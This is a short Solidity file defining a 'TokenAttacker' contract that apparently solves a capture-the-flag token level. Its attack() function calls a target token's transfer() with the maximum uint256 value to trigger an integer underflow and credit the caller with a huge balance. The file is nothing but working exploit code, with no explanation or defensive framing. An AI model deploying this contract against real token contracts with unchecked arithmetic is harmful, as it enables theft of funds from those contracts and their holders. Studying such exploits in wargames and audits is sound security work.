// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenAttacker {
    IToken token;

    constructor(address _tokenAddress) public {
        token = IToken(_tokenAddress);
    }

    function attack() external {
        token.transfer(msg.sender, type(uint256).max);
    }
}
